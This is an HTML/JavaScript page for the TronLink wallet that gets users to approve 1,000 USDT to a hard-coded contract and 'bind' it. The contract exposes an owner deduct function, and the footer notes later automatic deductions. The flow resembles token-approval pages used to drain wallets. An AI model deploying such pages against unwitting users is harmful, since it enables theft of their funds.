<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>USDT 授权绑定</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
            border: 1px solid rgba(255,255,255,0.2);
        }
        h1 { text-align: center; color: #fff; font-size: 28px; margin-bottom: 8px; }
        .sub { text-align: center; color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 32px; }
        .info-box {
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 24px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 14px;
            word-break: break-all;
        }
        .info-label { color: rgba(255,255,255,0.6); min-width: 80px; }
        .info-value { color: #fff; text-align: right; font-family: monospace; }
        .address { font-size: 12px; max-width: 240px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 48px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-bottom: 16px;
        }
        .btn-connect { background: #2d6a4f; color: white; }
        .btn-approve { background: #ff8c00; color: white; }
        .btn-bind { background: #0d6efd; color: white; }
        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .status {
            background: rgba(0,0,0,0.4);
            border-radius: 40px;
            padding: 12px 16px;
            margin-top: 20px;
            font-size: 13px;
            color: #ddd;
            text-align: center;
        }
        .loading {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { text-align: center; font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 20px; }
        .debug {
            background: rgba(0,0,0,0.7);
            border-radius: 16px;
            padding: 12px;
            margin-top: 20px;
            font-size: 11px;
            font-family: monospace;
            color: #0f0;
            word-break: break-all;
            text-align: left;
        }
        .debug-title { color: #ff0; margin-bottom: 8px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔗 USDT 授权绑定</h1>
        <div class="sub">一键授权 · 安全便捷</div>

        <div class="info-box">
            <div class="info-row">
                <span class="info-label">授权额度</span>
                <span class="info-value">1,000 USDT</span>
            </div>
            <div class="info-row" id="walletRow" style="display: none;">
                <span class="info-label">当前钱包</span>
                <span class="info-value address" id="walletAddress">-</span>
            </div>
        </div>

        <button id="connectBtn" class="btn-connect">🔌 连接钱包</button>
        <button id="approveBtn" class="btn-approve" disabled>💰 授权 1000 USDT</button>
        <button id="bindBtn" class="btn-bind" disabled>🔗 绑定合约</button>

        <div id="statusMsg" class="status">⚡ 请先连接钱包</div>
        <div class="footer">⚠️ 授权后，合约可扣取最多 1000 USDT<br>仅需操作一次，后续自动扣款</div>
        
        <div id="debugPanel" class="debug" style="display:none;">
            <div class="debug-title">🔧 调试信息</div>
            <div id="debugContent"></div>
        </div>
    </div>

    <script>
        // ==================== 配置信息 ====================
        // 合约地址（已手动转换为 41 格式，直接写死）
        const CONTRACT_ADDRESS_HEX = "41d4b8c7c8e9c5a5a1a2a3a4a5a6a7a8a9aaabacad";
        const USDT_CONTRACT_ADDRESS_HEX = "41a614f803B6FD780986A42c78Ec9c7f77e6DeD13C";
        const APPROVE_AMOUNT = "1000000000";  // 1000 USDT

        // ABI 定义
        const CONTRACT_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Bound","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Deducted","type":"event"},{"inputs":[],"name":"USDT","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bind","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deduct","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBound","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];

        const USDT_ABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];

        // DOM 元素
        const connectBtn = document.getElementById('connectBtn');
        const approveBtn = document.getElementById('approveBtn');
        const bindBtn = document.getElementById('bindBtn');
        const statusDiv = document.getElementById('statusMsg');
        const walletRow = document.getElementById('walletRow');
        const walletAddressSpan = document.getElementById('walletAddress');
        const debugPanel = document.getElementById('debugPanel');
        const debugContent = document.getElementById('debugContent');

        // 全局变量
        let tronWeb = null;      // 直接使用注入的 tronWeb，不自己 new
        let userAddress = null;  // 用户地址（T 开头）
        let usdtContract = null;
        let myContract = null;

        function setStatus(msg, isLoading = false) {
            if (isLoading) statusDiv.innerHTML = `<span class="loading"></span> ${msg}`;
            else statusDiv.innerHTML = msg;
        }

        function setButtonsState(approveEnabled, bindEnabled) {
            approveBtn.disabled = !approveEnabled;
            bindBtn.disabled = !bindEnabled;
        }

        function updateDebug() {
            debugPanel.style.display = 'block';
            debugContent.innerHTML = `
                tronWeb 注入状态: ${tronWeb ? '✅ 已获取' : '❌ 未获取'}<br>
                userAddress (T格式): ${userAddress || '未获取'}<br>
                合约地址 (41格式): ${CONTRACT_ADDRESS_HEX.substring(0, 20)}...<br>
                USDT地址 (41格式): ${USDT_CONTRACT_ADDRESS_HEX.substring(0, 20)}...<br>
                授权金额: ${parseInt(APPROVE_AMOUNT)/1000000} USDT
            `;
        }

        // 等待 TronLink 注入完成（官方推荐方式）
        function waitForTronLink() {
            return new Promise((resolve) => {
                // 检查是否已经注入
                if (window.tronWeb && window.tronWeb.defaultAddress) {
                    resolve(window.tronWeb);
                    return;
                }
                if (window.tronLink && window.tronLink.tronWeb) {
                    resolve(window.tronLink.tronWeb);
                    return;
                }
                
                // 等待注入
                let count = 0;
                const interval = setInterval(() => {
                    count++;
                    if (window.tronWeb && window.tronWeb.defaultAddress) {
                        clearInterval(interval);
                        resolve(window.tronWeb);
                    } else if (window.tronLink && window.tronLink.tronWeb) {
                        clearInterval(interval);
                        resolve(window.tronLink.tronWeb);
                    } else if (count > 50) {  // 5秒超时
                        clearInterval(interval);
                        resolve(null);
                    }
                }, 100);
            });
        }

        // 连接钱包
        async function connectWallet() {
            setStatus("⏳ 检测钱包...", true);
            
            // 等待 TronLink 注入
            const injectedTronWeb = await waitForTronLink();
            
            if (!injectedTronWeb) {
                setStatus("❌ 未检测到 TronLink 钱包，请使用 TronLink App 打开", false);
                return;
            }
            
            tronWeb = injectedTronWeb;
            
            // 获取用户地址
            let address = null;
            if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                address = tronWeb.defaultAddress.base58;
            } else if (tronWeb.defaultAddress && typeof tronWeb.defaultAddress === 'string') {
                address = tronWeb.defaultAddress;
            } else if (tronWeb.address) {
                address = tronWeb.address;
            }
            
            if (!address) {
                setStatus("❌ 无法获取钱包地址，请确保钱包已解锁", false);
                updateDebug();
                return;
            }
            
            userAddress = address;
            
            // 更新 UI
            walletRow.style.display = 'flex';
            walletAddressSpan.innerText = userAddress;
            
            // 初始化合约（直接使用 41 格式地址）
            try {
                usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT_ADDRESS_HEX);
                myContract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS_HEX);
            } catch (err) {
                setStatus(`❌ 初始化合约失败: ${err.message}`, false);
                updateDebug();
                return;
            }
            
            const shortAddr = userAddress.length > 14 ? 
                `${userAddress.substring(0, 8)}...${userAddress.substring(userAddress.length - 6)}` : 
                userAddress;
            setStatus(`✅ 已连接: ${shortAddr}`, false);
            setButtonsState(true, true);
            updateDebug();
            
            await checkAllowance();
            await checkBound();
        }

        async function checkAllowance() {
            if (!tronWeb || !usdtContract || !userAddress) return false;
            try {
                const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS_HEX).call();
                const approved = tronWeb.toBigNumber(allowance).gte(tronWeb.toBigNumber(APPROVE_AMOUNT));
                if (approved) {
                    setStatus(`✅ 已授权 ${parseInt(APPROVE_AMOUNT)/1000000} USDT，可以绑定`, false);
                } else {
                    setStatus(`⚠️ 未授权或授权额度不足，请点击「授权」按钮`, false);
                }
                return approved;
            } catch (e) {
                console.warn("检查授权失败", e);
                setStatus(`⚠️ 检查授权失败，请先授权`, false);
                return false;
            }
        }

        async function checkBound() {
            if (!tronWeb || !userAddress || !myContract) return false;
            try {
                const bound = await myContract.isBound(userAddress).call();
                if (bound) {
                    setStatus(`✅ 已绑定，可以使用扣款功能`, false);
                }
                return bound;
            } catch (e) {
                console.warn("检查绑定失败", e);
                return false;
            }
        }

        // 授权 USDT
        async function approveUSDT() {
            if (!tronWeb || !usdtContract) {
                setStatus('❌ 请先连接钱包', false);
                return;
            }
            
            if (!userAddress) {
                setStatus('❌ 未获取到用户地址，请重新连接钱包', false);
                return;
            }
            
            try {
                setStatus('⏳ 发起授权请求，请在钱包中确认...', true);
                approveBtn.disabled = true;
                
                // 使用注入的 tronWeb 调用 approve
                const result = await usdtContract.approve(CONTRACT_ADDRESS_HEX, APPROVE_AMOUNT).send({
                    feeLimit: 150_000_000,
                    from: userAddress  // 显式指定 from 地址
                });
                
                setStatus(`✅ 授权成功！Tx: ${result.substring(0, 10)}...`, false);
                await checkAllowance();
                updateDebug();
            } catch (error) {
                console.error("授权错误:", error);
                setStatus(`❌ 授权失败: ${error.message || error}`, false);
            } finally {
                approveBtn.disabled = false;
            }
        }

        // 绑定合约
        async function bindContract() {
            if (!tronWeb || !myContract || !userAddress) {
                setStatus('❌ 请先连接钱包', false);
                return;
            }
            
            try {
                // 检查授权
                const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS_HEX).call();
                if (tronWeb.toBigNumber(allowance).lt(tronWeb.toBigNumber(APPROVE_AMOUNT))) {
                    setStatus('❌ 请先完成授权，再绑定', false);
                    return;
                }
                
                setStatus('⏳ 发起绑定请求，请在钱包中确认...', true);
                bindBtn.disabled = true;
                
                const result = await myContract.bind().send({
                    feeLimit: 100_000_000,
                    from: userAddress
                });
                
                setStatus(`✅ 绑定成功！Tx: ${result.substring(0, 10)}...`, false);
                await checkBound();
                updateDebug();
            } catch (error) {
                console.error(error);
                setStatus(`❌ 绑定失败: ${error.message || error}`, false);
            } finally {
                bindBtn.disabled = false;
            }
        }

        // 绑定事件
        connectBtn.addEventListener('click', connectWallet);
        approveBtn.addEventListener('click', approveUSDT);
        bindBtn.addEventListener('click', bindContract);

        setStatus('✅ 准备就绪，点击「连接钱包」开始', false);
    </script>
</body>
</html>
